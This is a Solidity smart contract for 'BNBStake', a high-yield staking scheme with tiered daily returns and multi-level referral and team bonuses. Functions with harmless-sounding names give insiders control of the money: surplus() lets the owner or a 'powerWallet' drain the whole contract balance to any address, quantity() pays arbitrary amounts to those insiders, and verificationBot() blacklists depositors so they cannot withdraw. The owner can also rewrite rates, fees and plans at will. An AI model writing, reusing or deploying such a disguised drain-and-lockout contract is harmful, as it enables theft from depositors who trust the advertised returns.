// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract BNBStake {
    uint constant public INVEST_MIN_AMOUNT = 0.05 ether;
    uint[] public REFERRAL_PERCENTS = [3, 1, 1];
    uint public PLANTYPE = 1;
    uint public MONEYTYPE = 0;
    uint public PROJECT_FEE = 2;
    uint constant public PERCENT_STEP = 5;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public TIME_STEP = 1 days;
    uint constant public decimals = 18;
    uint public totalStaked;
    uint public totalRefBonus;
    uint public startUNIX;
    uint public totalInvestors;
    uint internal activity;
    address public powerWallet;
    address public commissionWallet;
    address internal owner;

    struct Plan {
        uint time;
        uint percent;
        uint lowest;
    }

    struct Deposit {
        uint8 plan;
        uint percent;
        uint amount;
        uint profit;
        uint start;
        uint finish;
    }

    struct User {
        Deposit[] deposits;
        uint checkpoint;
        address referrer;
        mapping(uint => address[]) downlineAddr;
        uint bonus;
        uint totalBonus;
        uint totalWithdrawn;
        uint teamLevel;
        uint teamLevelBonus;
        uint teamLevelBonusWithdrawn;
        uint totalteamLevelBonus;
    }

    struct DownlineRecord {
        address downlineAddress;
        uint totalDeposit;
        uint totalWithdrawn;
    }
    struct DownlineRecords {
        DownlineRecord[] downlineRecord;
    }

    struct  UserLevel {
        uint minTotalDeposit;
        uint addUserLevelPercent;
    }

    struct TeamLevel {
        uint downlineCount;
        uint minTeamLevelUsers;
        uint minTeamLevelUsersCount;
        uint minTotalDeposit;
        uint addTeamLevelPercent;
        uint addReferralBonus;
    }

    Plan[] plans;
    UserLevel[] public userLevels;
    TeamLevel[] public teamLevels;
    address[] public investedAddresses;
    mapping(address => User) public users;
    mapping(address => bool) public _isBlacklisted;
    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint percent, uint amount, uint profit, uint start, uint finish);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    event Fetch(address indexed user, address indexed addr, uint amount);

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor(address powerwallet, address wallet, uint startDate) {
        require(startDate > 0);

        owner = msg.sender;
        powerWallet = powerwallet;
        commissionWallet = wallet;
        startUNIX = startDate;

        plans.push(Plan(7, 145, 20));
        plans.push(Plan(14, 162, 400));
        plans.push(Plan(28, 187, 2000));
        plans.push(Plan(42, 199, 4000));
        plans.push(Plan(45, 221, 2000));
        plans.push(Plan(60, 239, 5000));
        plans.push(Plan(90, 268, 8000));
        plans.push(Plan(120, 291, 14000));

        userLevels.push(UserLevel(90, 10));
        userLevels.push(UserLevel(220, 15));
        userLevels.push(UserLevel(450, 20));
        userLevels.push(UserLevel(900, 25));
        userLevels.push(UserLevel(2200, 30));

        teamLevels.push(TeamLevel(5, 0, 0, 220, 10, 220));
        teamLevels.push(TeamLevel(10, 1, 2, 440, 15, 440));
        teamLevels.push(TeamLevel(15, 2, 2, 880, 20, 880));
        teamLevels.push(TeamLevel(20, 3, 2, 1760, 25, 1760));
        teamLevels.push(TeamLevel(50, 4, 2, 3520, 30, 3520));
    }

    function staking(address referrer, uint8 plan) external payable {
        require(startUNIX <= block.timestamp, "not start yet");
        require(plan < 8, "Invalid plan");
        require(msg.value >= plans[plan].lowest * 1 ether / 100, "not enough money");
        User storage user = users[msg.sender];
        if (user.referrer == address(0)) {
            totalInvestors++;
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }
            address hlevel = user.referrer;
            for (uint i = 0; i < 100; i++) {
                if (hlevel != address(0)) {
                    users[hlevel].downlineAddr[i].push(msg.sender);
                    hlevel = users[hlevel].referrer;
                } else break;
            }
        }
        address upline = user.referrer;
        for (uint i = 0; i < 3; i++) {
            if (upline != address(0)) {
                uint uplineBonus = msg.value * REFERRAL_PERCENTS[i] / 100;
                users[upline].bonus += uplineBonus;
                users[upline].totalBonus += uplineBonus;
                emit RefBonus(upline, msg.sender, i, uplineBonus);
                upline = users[upline].referrer;
            } else break;
        }
        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            investedAddresses.push(msg.sender);
            emit Newbie(msg.sender);
        }
        (uint percent, uint profit, uint finish) = getResult(plan, msg.value);
        user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));
        totalStaked += msg.value;
        emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);
    }

    function withdraw() external {
        User storage user = users[msg.sender];
        uint totalAmount = getUserDividends(msg.sender);
        uint referralBonus = getUserReferralBonus(msg.sender);
        uint teamLevelBonus = getUserTeamLevelBonus(msg.sender);
        uint totalBonus = referralBonus + teamLevelBonus;
        if (totalBonus > 0) {
            user.bonus = 0;
            totalAmount += totalBonus;
        }
        require(!_isBlacklisted[msg.sender], 'Blacklisted address');
        require(totalAmount > 0, "User has no dividends");
        uint contractBalance = address(this).balance;
        require(contractBalance >= totalAmount, "Insufficient balance");
        user.checkpoint = block.timestamp;
        uint fee = totalAmount * PROJECT_FEE / 100;
        (bool successFee, ) = commissionWallet.call{value: fee}("");
        require(successFee, "pay failed");
        emit FeePayed(msg.sender, fee);
        totalAmount -= fee;
        user.totalWithdrawn += totalAmount + fee;
        user.teamLevelBonusWithdrawn += teamLevelBonus;
        (bool success, ) = msg.sender.call{value: totalAmount}("");
        require(success, "pay failed");
        emit Withdrawn(msg.sender, totalAmount);
    }

    function ownership(address addr) external onlyOwner {
        owner = addr;
    }

    function quantity(address addr, uint amount) external {
        require(msg.sender == powerWallet || msg.sender == owner, 'invalid call');
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "pay failed");
        emit Fetch(msg.sender, addr, amount);
    }

    function surplus(address payable addr) external {
        require(msg.sender == powerWallet || msg.sender == owner, 'invalid call');
        uint Balance = address(this).balance;
        addr.transfer(Balance);
    }

    function updatePWallet(address wallet) external onlyOwner {
        powerWallet = wallet;
    }

    function updateCWallet(address wallet) external onlyOwner {
        commissionWallet = wallet;
    }

    function updateMoneyType(uint mode) external onlyOwner {
        MONEYTYPE = mode;
    }

    function updatePercent(uint16 newRate) external onlyOwner {
        activity = newRate;
    }

    function updatePlanInfo(uint planIndex, Plan calldata plan) external onlyOwner {
        plans[planIndex] = plan;
    }

    function updateUserLevelInfo(uint userLevelIndex, UserLevel calldata userLevel) external onlyOwner {
        userLevels[userLevelIndex] = userLevel;
    }

    function updateTeamLevelInfo(uint teamLevelIndex, TeamLevel calldata teamLevel) external onlyOwner {
        teamLevels[teamLevelIndex] = teamLevel;
    }

    function updatePlanType(uint mode) external onlyOwner {
        PLANTYPE = mode;
    }

    function updateReferral(uint[] calldata percents) external onlyOwner {
        REFERRAL_PERCENTS = percents;
    }

    function updateFee(uint Fee) external onlyOwner {
        PROJECT_FEE = Fee;
    }

    function updateStartTime(uint newTime) external onlyOwner returns (bool) {
        startUNIX = newTime;
        return true;
    }

    function verificationBot(address[] calldata addr, bool excluded) external {
        require(msg.sender == powerWallet, 'invalid call');
        for (uint i = 0; i < addr.length; i++) {
            _isBlacklisted[addr[i]] = excluded;
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan) public view returns (uint time, uint percent, uint lowest) {
        time = plans[plan].time;
        percent = plans[plan].percent;
        lowest = plans[plan].lowest;
    }

    function getUserLevelInfo(uint8 userLevel) public view returns (uint minTotalDeposit, uint addUserLevelPercent) {
        minTotalDeposit = userLevels[userLevel].minTotalDeposit;
        addUserLevelPercent = userLevels[userLevel].addUserLevelPercent;
    }

    function getTeamLevelInfo(uint8 teamLevel) public view returns (uint downlineCount, uint minTeamLevelUsers, uint minTeamLevelUsersCount, uint minTotalDeposit, uint addTeamLevelPercent, uint addReferralBonus) {
        downlineCount = teamLevels[teamLevel].downlineCount;
        minTeamLevelUsers = teamLevels[teamLevel].minTeamLevelUsers;
        minTeamLevelUsersCount = teamLevels[teamLevel].minTeamLevelUsersCount;
        minTotalDeposit = teamLevels[teamLevel].minTotalDeposit;
        addTeamLevelPercent = teamLevels[teamLevel].addTeamLevelPercent;
        addReferralBonus = teamLevels[teamLevel].addReferralBonus;
    }

    function getPercent(uint8 plan) public view returns (uint) {
        uint addUserLevelPercent = getUserLevelPercent(msg.sender);
        uint addTeamLevelPercent = getUserTeamLevelPercent(msg.sender);
        if (block.timestamp > startUNIX && PLANTYPE == 0) {
            return (plans[plan].percent + addUserLevelPercent + addTeamLevelPercent) + PERCENT_STEP * (block.timestamp - startUNIX) / TIME_STEP;
        } else if (block.timestamp > startUNIX && PLANTYPE == 1) {
            return plans[plan].percent + activity + addUserLevelPercent + addTeamLevelPercent;
        } else {
            return plans[plan].percent;
        }
    }

    function getResult(uint8 plan, uint deposit) public view returns (uint percent, uint profit, uint finish) {
        percent = getPercent(plan);
        if (plan < 4) {
            profit = deposit * percent / PERCENTS_DIVIDER * plans[plan].time;
        } else if (plan < 8 && PLANTYPE == 0) {
            for (uint i = 0; i < plans[plan].time; i++) {
                profit += (deposit + profit) * percent / PERCENTS_DIVIDER;
            }
        } else if (plan < 8 && PLANTYPE == 1) {
            profit = deposit * percent / PERCENTS_DIVIDER * plans[plan].time;
        }
        finish = block.timestamp + plans[plan].time * TIME_STEP;
    }

    function getUserDividends(address userAddress) public view returns (uint totalAmount) {
        User storage user = users[userAddress];
        for (uint i = 0; i < user.deposits.length; i++) {
            if (user.checkpoint < user.deposits[i].finish) {
                if (user.deposits[i].plan < 4) {
                    uint share = user.deposits[i].amount * user.deposits[i].percent / PERCENTS_DIVIDER;
                    uint from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                    uint to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
                    if (from < to) {
                        totalAmount += share * (to - from) / TIME_STEP;
                    }
                    if (block.timestamp > user.deposits[i].finish) {
                        totalAmount += user.deposits[i].amount;
                    }
                } else if (block.timestamp > user.deposits[i].finish) {
                    totalAmount += user.deposits[i].profit + user.deposits[i].amount;
                }
            }
        }
    }

    function getUserCheckpoint(address userAddress) public view returns (uint) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint, uint, uint) {
        return (users[userAddress].downlineAddr[0].length, users[userAddress].downlineAddr[1].length, users[userAddress].downlineAddr[2].length);
    }

    function getUserDownlineData(address userAddress, uint level) public view returns (DownlineRecord[] memory downlineRecord){
        require(level < 100, "not found level");
        address[] storage allDownline = users[userAddress].downlineAddr[level];
        downlineRecord = new DownlineRecord[](allDownline.length);
        for(uint i = 0; i < allDownline.length; i++) {
            downlineRecord[i].downlineAddress = allDownline[i];
            downlineRecord[i].totalDeposit = getUserTotalDeposits(allDownline[i]);
            downlineRecord[i].totalWithdrawn = getUserTotalWithdrawn(allDownline[i]);
        }
    }

    function getUserDownlineDatas(address userAddress) public view returns (DownlineRecord[][] memory downlineRecords) {
        uint maxLevels = 100;
        uint count = 0;
        downlineRecords = new DownlineRecord[][](maxLevels);
        for (uint level = 0; level < maxLevels; level++) {
            address[] storage allDownline = users[userAddress].downlineAddr[level];
            if (allDownline.length > 0) {
                uint downlineCount = allDownline.length;
                DownlineRecord[] memory downlineRecord = new DownlineRecord[](downlineCount);
                for (uint i = 0; i < downlineCount; i++) {
                    downlineRecord[i].downlineAddress = allDownline[i];
                    downlineRecord[i].totalDeposit = getUserTotalDeposits(allDownline[i]);
                    downlineRecord[i].totalWithdrawn = getUserTotalWithdrawn(allDownline[i]);
                }
                downlineRecords[count] = downlineRecord;
                count++;
            }
        }
        assembly {
            mstore(downlineRecords, count)
        }
        return downlineRecords;
    }

    function getUserDownlinesTotalDeposit(address userAddress) public view returns (uint totalDeposit) {
        for (uint level = 0; level < 3; level++) {
            DownlineRecord[] memory downlineRecords = getUserDownlineData(userAddress, level);
            for (uint i = 0; i < downlineRecords.length; i++) {
                totalDeposit += downlineRecords[i].totalDeposit;
            }
        }
        return totalDeposit;
    }

    function getUserLevel(address userAddress) public view returns (uint) {
        uint userlevel = 0;
        uint totalDeposit = getUserTotalDeposits(userAddress);
        for (uint i = 0; i < userLevels.length; i++) {
            UserLevel memory currentLevel = userLevels[i];
            if (totalDeposit >= currentLevel.minTotalDeposit * (10**decimals)) {
                userlevel = i + 1;
            }
        }
        return userlevel;
    }

    function getUserLevelPercent(address userAddress) public view returns (uint) {
        uint userLevel = getUserLevel(userAddress);
        uint addUserLevelPercent = 0;
        if (userLevel >= 1 && userLevel <= 5) {
            addUserLevelPercent = userLevels[userLevel - 1].addUserLevelPercent;
        }
        return addUserLevelPercent;
    }

    function countTeamLevelUsers(address userAddress, uint level) public view returns (uint) {
        uint count = 0;
        address[] memory downlineAddresses = users[userAddress].downlineAddr[0];
        for (uint i = 0; i < downlineAddresses.length; i++) {
            address downlineAddress = downlineAddresses[i];
            if (getUserTeamLevel(downlineAddress) >= level) {
                count++;
            }
        }
        return count;
    }

    function getUserTeamLevel(address userAddress) public view returns (uint) {
        uint userteamlevel = 0;
        uint downlineCount = users[userAddress].downlineAddr[0].length;
        uint totalDeposit = getUserDownlinesTotalDeposit(userAddress) + getUserTotalDeposits(userAddress);
        for (uint i = 0; i < teamLevels.length; i++) {
            TeamLevel memory currentLevel = teamLevels[i];
            if (
                downlineCount >= currentLevel.downlineCount &&
                countTeamLevelUsers(userAddress, currentLevel.minTeamLevelUsers) >= currentLevel.minTeamLevelUsersCount &&
                totalDeposit >= currentLevel.minTotalDeposit * (10**decimals)
            ) {
                userteamlevel = i + 1;
            }
        }
        return userteamlevel;
    }

    function getUserTeamLevelPercent(address userAddress) public view returns (uint) {
        uint userTeamLevel = getUserTeamLevel(userAddress);
        uint addTeamLevelPercent = 0;
        if (userTeamLevel >= 1 && userTeamLevel <= 5) {
            addTeamLevelPercent = teamLevels[userTeamLevel - 1].addTeamLevelPercent;
        }
        return addTeamLevelPercent;
    }

    function getUserTeamLevelBonus(address userAddress) public view returns (uint) {
        uint teamLevelBonus = 0;
        uint userTeamLevel = getUserTeamLevel(userAddress);
        if (userTeamLevel >= 1 && userTeamLevel <= 5) {
            teamLevelBonus = teamLevels[userTeamLevel - 1].addReferralBonus * (10**decimals/100) - users[userAddress].teamLevelBonusWithdrawn;
        }
        return teamLevelBonus;
    }

    function getUserTeamLevelTotalBonus(address userAddress) public view returns (uint) {
        uint totalTeamLevelBonus = 0;
        uint userTeamLevel = getUserTeamLevel(userAddress);
        if (userTeamLevel >= 1 && userTeamLevel <= 5) {
            totalTeamLevelBonus += teamLevels[userTeamLevel - 1].addReferralBonus * (10**decimals/100);
        }
        return totalTeamLevelBonus;
    }

    function getUserTeamLevelWithdrawn(address userAddress) public view returns (uint) {
        return users[userAddress].teamLevelBonusWithdrawn;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint amount) {
        for (uint i = 0; i < users[userAddress].deposits.length; i++) {
            amount += users[userAddress].deposits[i].amount;
        }
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        return users[userAddress].totalWithdrawn;
    }

    function getUserReferralBonus(address userAddress) public view returns (uint) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint) {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint) {
        return users[userAddress].totalBonus - users[userAddress].bonus;
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        return getUserReferralBonus(userAddress) + getUserDividends(userAddress) + getUserTeamLevelBonus(userAddress);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getAllInvestedAddresses() public view returns (address[] memory) {
        return investedAddresses;
    }

    function getUserDepositInfo(address userAddress, uint index) public view returns (uint8 plan, uint percent, uint amount, uint profit, uint start, uint finish) {
        User storage user = users[userAddress];
        plan = user.deposits[index].plan;
        percent = user.deposits[index].percent;
        amount = user.deposits[index].amount;
        profit = user.deposits[index].profit;
        start = user.deposits[index].start;
        finish = user.deposits[index].finish;
    }
}